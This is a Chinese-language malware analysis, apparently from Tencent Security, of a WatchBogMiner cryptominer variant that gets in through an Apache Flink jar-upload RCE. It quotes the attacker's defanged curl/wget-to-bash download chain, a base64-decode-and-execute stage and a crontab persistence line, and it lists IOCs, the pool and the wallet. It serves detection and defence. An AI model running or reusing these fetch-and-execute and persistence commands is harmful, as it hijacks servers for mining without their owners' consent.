## 一、背景

腾讯主机安全（云镜）捕获WatchBogMiner挖矿木马最新变种对云主机的攻击，该变种利用Apache
Flink任意Jar包上传导致远程代码执行漏洞入侵云主机，然后下载文件名为“watohdog”的门罗币挖矿木马。

该挖矿木马最初的版本是针对Linux服务器利用Nexus Repository
Manager、Supervisord、ThinkPHP等服务器组件的远程代码执行漏洞进行攻击。根据其最初下载的挖矿木马文件名，安全厂商将其命名为“Watchbog”挖矿木马。

腾讯安全近期检测到“Watchbog”的最新变种开始利用Redis未授权访问漏洞、Apache
Flink远程代码执行漏洞入侵传播，根据其算力推测，该变种已控制约8000台服务器挖矿，挖矿收益约1.2万元。

## 二、详细分析

Apache Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。基于流执行引擎，Apache
Flink提供了诸多更高抽象层的API以便用户编写分布式任务。

2019年11月Aapche Flink被爆出漏洞，攻击者可直接在Apache
Flink中上传任意jar包，从而达到远程代码执行的目的。漏洞POC代码已被公开：https://github.com/LandGrey/flink-unauth-rce

攻击者首先利用Flink漏洞上传恶意jar包：

![](https://image.3001.net/images/20201027/1603791275_5f97e9ab5a201131617aa.png!small)

然后执行远程命令：

    
    
    /bin/bash -c (curl -s http[:]//nabladigital.biz/img/ddxox.png||wget -q -O- http[:]//nabladigital.biz/img/ddxox.png)|bash

其中ddxox.png代码:

    
    
    nohup bash -c '(curl -fsSL http[:]//nabladigital.biz/img/sg*h*bw.png||wget -q -O- http[:]//nabladigital.biz/img/sg*h*bw.png)|bash' > /dev/null 2>&1 &
    
    rm -rf /tmp/seele*

sg*h*bw.png代码:

    
    
    (curl -fsSL http[:]//nabladigital.biz/img/afhpo.png||wget -q -O - http[:]//nabladigital.biz/img/afhpo.png)|base64 -d|bash

最终执行的afhpo.png首先定义三个变量house、park、room

    
    
    house=http[:]//nabladigital.biz/img/ddxox.png
    
    park= https[:]//files.catbox.moe/5j9zcz
    
    room= https[:]//a.pomf.cat/wariie

然后crontab命令创建定时任务，每10分钟下载执行一次以上脚本：

    
    
    (crontab -l 2>/dev/null; echo "*/10 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1")| crontab –

通过写入以下文件创建定时任务：

/etc/cron.d/root

/etc/cron.d/system

/etc/cron.d/apache

/var/spool/cron/crontabs/root

/var/spool/cron/root

![](https://image.3001.net/images/20201027/1603791294_5f97e9beb2f501448563a.png!small)

接着下载挖矿木马http[:]//nabladigital.biz/img/qczgb.png，base64解码后保存至目录/tmp/systemd-private-64aa0008dfb47a84a96f7974811b772f-systemd-timesyncd.service-TffNff/tmp/watohdog（之前的版本，该文件名为watchbog）。

![](https://image.3001.net/images/20201027/1603791308_5f97e9cca2f71dbe95a04.png!small)

watohdog是XMRig经过修改编译的挖矿程序。

![](https://image.3001.net/images/20201027/1603791322_5f97e9dacd3c127be4a41.png!small)

矿池：104.140.201.42:3333

钱包：

489cbwS5qsKFsNphUjABEyEvLCJWb3e9YDg5BE94MmyeGEbLQhK5DsSMEBGKoCcvbg4oEjCWyRx21gu9XAo6QkhgNfkryRd

收益：已挖矿获得门罗币13.82XMR，市值约1.2万元。平均算力103 KH/s，以此推算Watchbog最新变种已控制约8000台服务器挖矿。

![](https://image.3001.net/images/20201027/1603791339_5f97e9eb3f7c9a0a250c8.png!small)

## IOCs

 **Domain**

nabladigital.biz

 **URL**

http[:]//nabladigital.biz/img/ddxox.png

http[:]//nabladigital.biz/img/sg*h*bw.png

http[:]//nabladigital.biz/img/afhpo.png

http[:]//nabladigital.biz/img/qczgb.png

https[:]//files.catbox.moe/5j9zcz

https[:]//a.pomf.cat/wariie

 **MD5**

Watohdog

1df8307ae2d2524628b1322ac864d96c

ddxox.png

791e8ecf4dee71dd0e0da129b938258f  

sg*h*bw.png

ef5323cac300f68fb77ac23c39236bf2  

afhpo.png

9ef94e8b41893c4b1a85c327a3bcae3f

 **钱包：**

489cbwS5qsKFsNphUjABEyEvLCJWb3e9YDg5BE94MmyeGEbLQhK5DsSMEBGKoCcvbg4oEjCWyRx21gu9XAo6QkhgNfkryRd

## 参考连接：

  1. Apache Flink任意Jar包上传导致远程代码执行

<https://mp.weixin.qq.com/s/ArYCF4jjhy6nkY4ypib-Ag>

  2. Apache Flink 任意 Jar 包上传导致远程代码执行漏洞复现

<https://cloud.tencent.com/developer/article/1544254>

  

